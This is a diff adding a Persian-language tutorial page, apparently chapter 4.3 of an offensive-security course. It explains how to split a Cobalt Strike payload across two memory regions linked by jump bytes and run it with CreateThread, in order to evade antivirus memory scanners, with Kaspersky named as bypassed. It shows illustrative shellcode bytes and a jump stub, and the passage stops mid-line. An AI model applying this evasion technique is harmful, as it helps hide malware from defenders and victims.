@@ -1,0 +1,1736 @@
+<html dir="rtl">
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>chapter 4.3</title>
+ 
+<style>
+<!--
+* { margin:0;}
+    .P48 { color:#00000a; font-size:12pt; text-align:left ! important; font-family:Liberation Serif; writing-mode:lr-tb; }
+    .T7 { color:#333333; font-family:arial; font-size:12pt; font-weight:bold; }
+    .P15 { color:#00000a; font-size:10pt; text-align:left ! important; font-family:arial; writing-mode:lr-tb; margin-left:0.1866in; margin-right:0in; text-indent:0in; }
+    .T34 { color:#000000; font-family:arial; font-size:8pt; font-style:italic; font-weight:bold; }
+    .T32 { color:#000000; font-family:arial; font-size:8pt; font-weight:normal; }
+    ._5f_OOoComputerComment { color:#4c4c4c; font-family:Courier New; }
+    .T39 { font-size:8pt; font-weight:normal; }
+    ._5f_OOoComputerIdent { color:#008000; font-family:Courier New; }
+    .T38 { font-size:8pt; font-weight:normal; }
+    ._5f_OOoComputerSpecial { color:#000000; font-family:Courier New; }
+    ._5f_OOoComputerNumber { color:#ff3200; font-family:Courier New; }
+    ._5f_OOoComputerLiteral { color:#ff0000; font-family:Courier New; }
+    ._5f_OOoComputerKeyWord { color:#000080; font-family:Courier New; }
+    .P19 { color:#00000a; font-size:12pt; text-align:left ! important; font-family:Liberation Serif; writing-mode:lr-tb; margin-left:0.1866in; margin-right:0in; text-indent:0in; }
+    .T17 { font-family:arial; font-size:8pt; }
+    .P17 { color:#00000a; font-size:10pt; text-align:left ! important; font-family:arial; writing-mode:lr-tb; margin-left:0.1866in; margin-right:0in; text-indent:0in; }
+    .T51 { font-size:8pt; font-weight:normal; }
+    .T28 { color:#000000; font-family:arial; font-size:8pt; font-weight:normal; }
+    .T53 { font-size:8pt; font-weight:normal; }
+-->
+</style>
+ 
+</head>
+
+<body background="../x3.jpeg">
+
+<p class="P48" dir="ltr"><span class="T7"><font face="Tahoma" size="3">Chapter
+4 : </font><font face="Tahoma">Executing Native Codes in Local Process (Part3)</font></span></p>
+<p class="P48" dir="ltr"><b><font face="Tahoma" size="2" color="#000080">4.3 Chunking CobaltStrike Payloads + Jump Method</font></b></p>
+<table border="0" width="100%" id="table1" cellspacing="0" cellpadding="0" style="border-left-width: 0px; border-right-width: 0px; border-bottom-width: 0px">
+	<tr>
+		<td>
+		<p align="center"><span lang="fa"><b><font face="Tahoma" size="2">بنام 
+		خدا</font></b></span></td>
+	</tr>
+	<tr>
+		<td><b><font face="Tahoma" size="2"><span lang="fa">دراین</span> <span lang="fa">
+		بخش 3 از فصل چهارم تکنیکی را بررسی می کنیم برای </span><a name="Chunk_">
+		<font color="#008000">Chunk</font></a><span lang="fa"> کردن
+		</span>Payload <span lang="fa">ها یا جدا کردن </span>Payload<span lang="fa"> 
+		ها را بررسی می کنیم.</span></font></b></td>
+	</tr>
+	<tr>
+		<td><b><span lang="fa"><font face="Tahoma" size="2">با کمک این روش 
+		جداکردن </font></span><font face="Tahoma" size="2">Payload<span lang="fa"> 
+		در </span>Memory<span lang="fa"> شما مشاهده خواهید کرد که چگونه </span>
+		Kaspersky<span lang="fa"> دورزده می شود .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در این تکنیک برای جدا 
+		کردن </span>CobaltStrike<span lang="fa"> در </span>Memory<span lang="fa"> 
+		من از </span>Jump Method<span lang="fa"> کمک گرفتم تا </span>Payload<span lang="fa"> 
+		خود را در</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Memory<span lang="fa"> بصورت جداگانه 
+		اجرا کنیم یعنی بخش اول </span>Payload<span lang="fa"> اجرا می شود در
+		</span>Memory<span lang="fa"> در </span>Address A<span lang="fa"> سپس</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">کد</font></b></span><b><span lang="fa"><font face="Tahoma" size="2"> </font></span>
+		<font face="Tahoma" size="2">Jump<span lang="fa"> می کند به بخش دوم
+		</span>Payload<span lang="fa"> در </span>Memory<span lang="fa"> و آن را 
+		اجرا می کند اما چرا ما این کار را می کنیم؟&nbsp; </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">برای اینکه با این کار 
+		برخی آنتی ویروسها در زمان چک کردن </span>Memory<span lang="fa"> بدلیل 
+		اینکه </span>Payload<span lang="fa"> ما به دو بخش یا چند بخش</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">تقسیم شده در </font>
+		</span><font face="Tahoma" size="2">Memory<span lang="fa"> آن را نمی 
+		توانند </span>Detect<span lang="fa"> کنند و کد ما اجرا می شود بدون آنکه 
+		شناسایی شود .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در اینجا من </font>
+		</span><font face="Tahoma" size="2">CobaltStrike Payload<span lang="fa"> 
+		را به دو بخش تقسیم کرده ام اما اگر بخواهید آن را به بخشهای بیشتری تقسیم 
+		کنید باید</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">کمی با </font></span>
+		<font face="Tahoma" size="2">Shell<span lang="fa"> کد موجود در </span>
+		Payload<span lang="fa"> آشنا باشید و بدانید که چگونه می تواند آن را به 
+		چندین بخش تقسیم کرد و نمی توان از هرجای</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Payload<span lang="fa"> که خواستید آن را 
+		تقسیم کنید و اینکار معمولا جواب نمی دهد و به مشکل می خورید برای همین من 
+		آن را به 2 بخش تقسیم کرده ام .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2" color="#000080">Chunking Payloads 
+		in-memory + Jump Method</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در اینجا باید کمی در 
+		مورد اینکه چگونه یک </span>Payload<span lang="fa"> را می توانید به 2 بخش 
+		تقسیم کرد صحبت کنیم .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">برای </span>Chunk<span lang="fa"> 
+		کردن یک </span>Payload<span lang="fa"> بکمک </span>Jump Method<span lang="fa"> 
+		شما می توانید مراحل زیر را انجام دهید .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">اول دقیق مشخص کنید از 
+		کدام بخش </font></span><font face="Tahoma" size="2">Payload<span lang="fa"> 
+		می خواهید آن را تقسیم کنید سپس هر بخش از </span>Payload</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">را در </font></span>
+		<font face="Tahoma" size="2">Memory<span lang="fa"> بصورت جداگانه </span>
+		Write<span lang="fa"> کنید که در این کد من از </span>
+		<font color="#008000">VirtualAllocExNuma<span lang="fa"> </span></font>
+		<span lang="fa">برای اختصاص دادن</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">فضا در </font></span>
+		<font face="Tahoma" size="2">Memory<span lang="fa"> استفاده کرده ام و از
+		</span>RtlMoveMemory<span lang="fa"> برای </span>Write<span lang="fa"> 
+		کردن بر روی </span>Memory<span lang="fa"> استفاده کرده ام</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">درنتیجه در کد من از
+		</span>API<span lang="fa"> هایی استفاده کرده ام که ممکن می باشد موجب
+		</span>Detect<span lang="fa"> شدن کد شود اما در ادامه </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">مشاهده می کنید با اینکه 
+		از این توانبع استفاده شده کد من توسط </font></span>
+		<font face="Tahoma" size="2">Kaspersky v21<span lang="fa"> با آخرین
+		</span>Update<span lang="fa"> شناسایی نمی شود</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در مرحله بعد بعد از
+		</font></span><font face="Tahoma" size="2">Write<span lang="fa"> کردن هر 
+		دو بخش </span>Payload<span lang="fa"> در </span>Memory<span lang="fa"> 
+		در آدرسهای جداگانه شما نیاز دارید که بخش اول</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Payload<span lang="fa"> شما بتواند بعد 
+		از اجرا شدن رجوع کند به بخش دوم یا </span>Section 2 of Payload<span lang="fa"> 
+		برای اجرا درنتیجه شما</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">نیاز دارید در بخش یک
+		</font></span><font face="Tahoma" size="2">Payload<span lang="fa"> در 
+		آخر آن یکسری </span>Byte Array<span lang="fa"> اضافه کنید که کار </span>
+		Jump<span lang="fa"> کردن از بخش 1 به بخش 2 را</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">برای شما در </font>
+		</span><font face="Tahoma" size="2">Memory<span lang="fa"> انجام دهد 
+		یعنی بخش یک زمانی که در </span>Memory<span lang="fa"> اجرا شد در آخر کد 
+		آن بصورت خودکار کد </span>Jump<span lang="fa"> می کند</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">به اول بخش 2 از </font>
+		</span><font face="Tahoma" size="2">Payload<span lang="fa"> که در آدرسی 
+		متفاوت در </span>Memory<span lang="fa"> نوشته شده در نتیجه هر 2بخش به 
+		ترتیب اجرا شده در </span>Memory</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و اگر همه چیز درست انجام 
+		شود شما باید </font></span><font face="Tahoma" size="2">Session<span lang="fa"> 
+		را در طرف </span>CobaltStrike<span lang="fa"> داشته باشید .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در اینجا یک مثال مشاهده 
+		می کنید تا کمی بهتر متوجه </span>Background <span lang="fa">کار شوید :</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">Cobaltstrike 
+		payload:
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font> 
+		<font color="#008000">AA BB CC DD EE FF 11 22 33 44 55 66 77</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2" color="#000080">Chunking Payloads step1</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font size="2" face="Tahoma">In-memory 
+		Section 1 Address [<font color="#FF3200">0x1CC0080</font>]:
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font> 
+		+ <font color="#333333">JUMP Bytes to address Section 2</font><font color="#FF0000">
+		</font><font color="#800000">[</font><font color="#FF3200">0x1CE0080</font><font color="#800000">]</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr"><b><font size="2" face="Tahoma">In-memory Section 2 Address 
+		[<font color="#FF3200">0x1CE0080</font>]: <font color="#008000">AA BB CC 
+		DD EE FF 11 22 33 44 55 66 77</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">همانطور که مشاهده می 
+		کنید ما یک </font></span><font face="Tahoma" size="2">CobbaltStrike<span lang="fa">
+		</span>Payload<span lang="fa"> داریم که به دو بخش تقسیم شده با دو رنگ 
+		حالا </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">دقیقا می دانیم که اول و 
+		آخر هر بخش کجا می باشد در نتیجه این دو بخش را در </span>Memory<span lang="fa"> 
+		باید در آدرسهای متفاوت با</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">توابعی که داریم مانند
+		</font></span><font face="Tahoma" size="2">VirtualAlloc<span lang="fa"> 
+		یا </span>VirtualAllocExNuma<span lang="fa"> و ... یک فضایی در حافظه 
+		برای آنها در نظر بگیریم</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">سپس انها را توسط </font>
+		</span><font face="Tahoma" size="2">RtlMoveMemory<span lang="fa"> یا
+		</span>WriteProcessMemory<span lang="fa"> بر روی </span>Memory<span lang="fa"> 
+		نوشته تا اینجا مشکلی ما نداریم و همانند این کار </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">را در فصلهای قبلی انجام 
+		داده ایم. </font></span></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2" color="#000080">Chunking Payloads step2</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">کاری که در این تکنیک ما 
+		باید اضافه کنیم به این کد این می باشد که در آخر بخش یک از </font></span><font face="Tahoma" size="2">Payload<span lang="fa"> 
+		ما</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">باید یک </font></span>
+		<font face="Tahoma" size="2">Jump<span lang="fa"> کد را به </span>
+		Payload<span lang="fa"> اضافه کنیم تا درزمان اجرا کد بلافاصله پرش کند به 
+		بخش 2 .یعنی در بخش یک </span>Payload<span lang="fa"> بعد از </span>Byte
+		<font color="#999966">AF</font><span lang="fa"> در آخر آن </span></font>
+		</b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">باید </font></span>
+		<font face="Tahoma" size="2">Byte<span lang="fa"> های </span>Jump<span lang="fa"> 
+		اضافه شود به </span>Payload<span lang="fa"> در </span>Section 1<span lang="fa"> 
+		ما . که این </span>Jump<span lang="fa"> کد ما دارای آدرس بخش 2 از </span>
+		Payload<span lang="fa"> در </span>Memory<span lang="fa"> می باشد .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">برای این کار من از
+		</font></span><font face="Tahoma" size="2">Jump Method
+		<font color="#0000FF">B8</font> <font color="#FF0000">00 00 00 00</font>
+		<font color="#0000FF">FF E0</font><span lang="fa"> استفاده کرده ام در 
+		نتیجه ما چیزی مانند کدهای زیر را داریم برای این مثال</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font size="2" face="Tahoma">In-memory 
+		Section 1 Address [<font color="#FF3200">0x1CC0080</font>]:
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font> 
+		<font color="#0000FF"><span lang="fa">B</span>8</font><font color="#FF3200"><span lang="fa">
+		</span>80 00 CE 01 </font><font color="#0000FF">FF E0</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">In-memory 
+		Section 2 Address [<font color="#FF3200">0x1CE0080</font>]:
+		<font color="#008000">AA BB CC DD EE FF 11 22 33 44 55 66 77</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">همانند مثال بالا کد
+		</font></span><font face="Tahoma" size="2">Section1 <span lang="fa">در 
+		زمان اجرا وقتی به قسمت آبی رنگ </span>B8<span lang="fa"> برسد پرش می کند 
+		به آدرسی که در چهار بایت بعدی آن مشخص شده</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">که همان بخش دوم یا
+		</font></span><font face="Tahoma" size="2">Section2<span lang="fa"> ما 
+		می باشد از </span>Payload<span lang="fa"> و در آخر با اجرای این تکنیک شما 
+		می توانید </span>Session<span lang="fa"> را در </span>CobaltStrike<span lang="fa"> 
+		داشته باشید</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و این روش همانند این می 
+		باشد که همه </font></span><font face="Tahoma" size="2">Payload<span lang="fa"> 
+		را در یک </span>Section<span lang="fa"> در </span>Memory<span lang="fa"> 
+		نوشته باشیم اما در حقیقت در 2 آدرس جدا در </span>Memory</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">ما این </font></span>
+		<font face="Tahoma" size="2">Payload<span lang="fa"> ها را نوشته ایم با 
+		این کار شما دارای </span>Payload<span lang="fa"> های تقسیم شده در </span>
+		Memory<span lang="fa"> می باشید در نتیجه </span>Signature<span lang="fa"> 
+		های </span>Payload<span lang="fa"> های شما</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">با </font></span>
+		<font face="Tahoma" size="2">Signature<span lang="fa"> یک </span>Payload<span lang="fa"> 
+		کامل که برای </span>CobaltStrike<span lang="fa"> می باشد یکسان نمی باشد 
+		در </span>Memory<span lang="fa"> و این کار می تواند به شما کمک کند برخی</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">آنتی ویروسها و </font>
+		</span><font face="Tahoma" size="2">Memory Scanner<span lang="fa"> های 
+		آنها را </span>Bypass<span lang="fa"> کنید در زمانی که این بخشهای </span>
+		Payload<span lang="fa"> شما را در آدرسهای متفاوت </span>Scan<span lang="fa"> 
+		می کنند .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در این روش ما 2 </font>
+		</span><font face="Tahoma" size="2">Payload<span lang="fa"> داریم که به 
+		ترتیب اجرا می شوند در </span>Memory<span lang="fa"> و در 2 آدرس جداگانه
+		</span><font color="#FF0000">0x1CC0080</font><span lang="fa"> و </span>
+		<font color="#FF0000">0x1CE0080</font><span lang="fa"> نوشته شده اند .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در نتیجه برخی </font>
+		</span><font face="Tahoma" size="2">Memory Scanner<span lang="fa"> ها 
+		توسط این روش دور زده می شوند اما اگر کل </span>Payload<span lang="fa"> 
+		در یک </span>Section<span lang="fa"> می بود مطمنا </span>Detect<span lang="fa"> 
+		می شد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">توسط </font></span>
+		<font face="Tahoma" size="2">Memory Scanner<span lang="fa"> ها بدلیل 
+		اینکه </span>Signature<span lang="fa"> کدهای ما با </span>DataBase<span lang="fa"> 
+		آنها یکسان می بود و در نتیجه کد شناسایی میشد اما در این حالت</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">امکان خطای </font>
+		</span><font face="Tahoma" size="2">Memory<span lang="fa"> </span>
+		Scanner<span lang="fa"> ها بالا می باشد و معمولا </span>Bypass<span lang="fa"> 
+		می شوند اما نمی توان با اطمینان این را برای همه آنتی ویروس ها گفت</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">برخی ممکن می باشد </font>
+		</span><font face="Tahoma" size="2">Payload<span lang="fa"> را در </span>
+		Memory<span lang="fa"> شناسایی نکنند اما کد شما را بر روی </span>
+		Harddisk<span lang="fa"> شناسایی کند که اجرا شده به عنوان کدی مخرب</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و برخی ممکن می باشد که 
+		این تکنیک را کلا شناسایی نکنند اما زمانی که در شبکه </font></span>
+		<font face="Tahoma" size="2">Network connection<span lang="fa"> بین
+		</span>Process<span lang="fa"> شما با </span>Cobaltstrike</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">برقرار می شود آن ترافیک 
+		را بعنوان ترافیک آلوده یا مخرب شناسایی کنند و الی آخر درنتیجه بر روی تک 
+		تک آنتی ویروسها باید این نوع کدها</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">تست شود تا روشهای برخود 
+		آنها را بررسی کنید جداگانه .</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">برای اجرای کد در
+		</font></span><font face="Tahoma" size="2">Section1<span lang="fa"> ما 
+		نیاز داریم که کد آن را توسط </span>CreateThread<span lang="fa"> اجرا 
+		کنیم یا روش بهتر این می باشد که از یک </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Jump<span lang="fa"> دیگه استفاده کنیم 
+		برای اجرا </span>Section1<span lang="fa"> . من در کد مربوط به این بخش هر 
+		دو کار را با هم انجام داده ام یعنی یک </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Byte Array<span lang="fa"> از کد </span>
+		Jump<span lang="fa"> به آدرس </span>Section 1<span lang="fa"> را بر روی
+		</span>Memory<span lang="fa"> نوشته ام سپس آن را با </span>CreateThread<span lang="fa"> 
+		اجرا کرده ام</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در نتیجه مشاهده می کنید 
+		که کد من بسیار ریسکی می باشد و احتمال </font></span>
+		<font face="Tahoma" size="2">Detect<span lang="fa"> شدن آن بالا می باشد 
+		توسط آنتی ویروسها</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">برای&nbsp; اینکه از 
+		توابعی همانند </span>CreateThread<span lang="fa"> و ... استفاده کرده ام 
+		اما مشاهده خواهید کرد با این حال کد من کار می کند و </span>Kaspersky<span lang="fa"> 
+		دور زده می شود.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و به این دلیل می باشد که 
+		در زمان </font></span><font face="Tahoma" size="2">Scan <span lang="fa">
+		کردن </span>Memory<span lang="fa"> آنتی ویروس </span>Kaspersky<span lang="fa"> 
+		متوجه نمی شود که </span>Payload<span lang="fa"> تقسیم شده و </span>
+		</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">دارای </font></span>
+		<font face="Tahoma" size="2">Signature<span lang="fa"> یکسان با </span>
+		DB<span lang="fa"> خود نمی بیند </span>Payload<span lang="fa"> های ما را 
+		در </span>Memory<span lang="fa"> در نتیجه </span>Bypass <span lang="fa">
+		می شود.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center">
+		<img border="0" src="26feb2024x_files/Pics/CH4_3_0.PNG" width="1006" height="714"></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center">
+		</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center" dir="ltr"><b><font face="Tahoma" size="2">Picture 1</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 1 مشاهده می کنید 
+		در بخشی که به رنگ آبی اشاره شده در آدرس </span>0x01cb0080<span lang="fa"> 
+		ما یک </span>Byte array<span lang="fa"> داریم با</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">با این بایتها </font>
+		</span><font face="Tahoma" size="2"><font color="#808080">F9 F9 F9</font>
+		<font color="#0000FF">B8</font> <font color="#FF0000">80 00 CC 01 </font>
+		<font color="#0000FF">FF E0 </font><span lang="fa">زمانی که این بایتها 
+		توسط </span>CreateThread<span lang="fa"> اجرا شوند کد شما پرش می کند
+		</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">به آدرس قرمز رنگ در این 
+		بایتها که آدرس بصورت برعکس در این آرایه نوشته شده یعنی آدرس ما می باشد<font color="#FF0000">
+		</font></span></font><font face="Tahoma" size="2" color="#CC9900">
+		0x1CC0080</font><font color="#FF0000" face="Tahoma" size="2"><span lang="fa">&nbsp;
+		</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در نتیجه این آدرسی می 
+		باشد که بعد از اجرا این کد توسط </font></span>
+		<font face="Tahoma" size="2">CreateThread<span lang="fa"> به آن </span>
+		Jump<span lang="fa"> می شود برای ادامه اجرای کد .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و این آدرس همان آدرس
+		</font></span><font face="Tahoma" size="2">Section 1<span lang="fa"> ما 
+		می باشد که در شکل 1 مشاهده می کنید که با رنگ قرمز مشخص شده در شکل 1 .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در آدرس خانه </span>
+		0x1CC00<font color="#FF0000">80 </font><span lang="fa">در خانه 80 این 
+		آدرس مشاهده می کنید که بایتهای </span>FC 48 83 E4 <span lang="fa">و الی 
+		آخر که همان </span>Section1<span lang="fa"> ما می باشد.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font size="2" face="Tahoma">In-memory 
+		Section 1 Address [<font color="#CC9900">0x1CC0080</font>]:
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font> 
+		+ <font color="#333333">JUMP Bytes to address Section 2</font><font color="#FF0000">
+		</font><font color="#800000">[</font><font color="#FF3200">0x1CE0080</font><font color="#800000">]</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در مرحله بعد </span>
+		Section1<span lang="fa"> ما اجرا می شود یعنی </span>
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font>&nbsp;
+		<span lang="fa">در </span>Memory<span lang="fa"> اجرا می شود تا</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">اجرای کد ما برسد به 
+		آخرین بایت ما که در این مثال </span></font><font face="Tahoma" size="2">
+		AF<span lang="fa"> می باشد</span> <span lang="fa">البته </span>AF<span lang="fa"> 
+		یک مثال می باشد و در واقعیت </span>Payload<span lang="fa"> شما بسیار 
+		بیشتر از این </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">چند بایت می باشد و این 
+		فقط برای مثال می باشد و ممکن می باشد بایت آخر شما در مثال واقعی بایت
+		</font></span><font face="Tahoma" size="2">AF<span lang="fa"> نباشد این 
+		نکته باید گفته می شد که</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">موجب اشتباه نشود.</font></b></span><b><font face="Tahoma" size="2"><span lang="fa"> 
+		سپس همانطور که در مرحله </span></font>
+		<font face="Tahoma" size="2" color="#000080">Chunking Payloads step2<span lang="fa">
+		</span></font><font face="Tahoma" size="2"><span lang="fa">گفته شد زمانی 
+		که اجرای کد به بایت آخر بخش اول رسید کد یک </span>Jump<span lang="fa"> 
+		دیگر</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">دارد به بخش</span></font><span lang="fa"><font face="Tahoma" size="2"> 
+		دوم یا </font></span><font face="Tahoma" size="2">Section2<span lang="fa"> 
+		برای </span>Payload<span lang="fa"> تا کامل </span>CobaltStrike Payload<span lang="fa"> 
+		در حافظه اجرا شود.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">همانند شکل 1 کد </font>
+		</span><font face="Tahoma" size="2">Section1<span lang="fa"> که در تصویر 
+		مشخص می باشد و با </span>FC 48 83 E4<span lang="fa"> شروع شده ادامه دارد 
+		و دراخر آن </span>Jump byte<span lang="fa">s ما </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">به ادرس بخش دوم اضافه 
+		شده یعنی </font></b></span><b><font size="2" face="Tahoma">
+		<font color="#0000FF"><span lang="fa">B</span>8</font><font color="#FF3200"><span lang="fa">
+		</span> </font><font color="#800000">80 00 CE 01</font><font color="#FF3200"> </font><font color="#0000FF">FF E0 </font>
+		<span lang="fa">به آن اضافه شده البته در شکل 1 مشخص نمی باشد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font size="2" face="Tahoma">In-memory 
+		Section 1 Address [<font color="#FF3200">0x1CC0080</font>]:
+		<font color="#999966">FC 48 83 E4 F0 E8 C8 00 00 00 41 41 41 50 52 AF</font> 
